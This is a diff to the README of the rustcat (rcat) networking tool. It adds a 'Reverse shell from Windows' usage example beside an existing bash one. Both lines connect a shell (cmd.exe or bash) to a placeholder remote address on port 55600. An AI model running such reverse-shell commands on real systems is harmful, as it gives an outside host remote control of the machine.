@@ -36,6 +36,10 @@ and to connect:
 ```
 rcat connect -s bash the.0.0.ip 55600
 ```
+Reverse shell from Windows:
+```
+rcat connect -s cmd.exe the.0.0.ip 55600
+```
 
 For some more basic usage, check [here](https://github.com/robiot/rustcat/wiki/Basic-Usage)
 
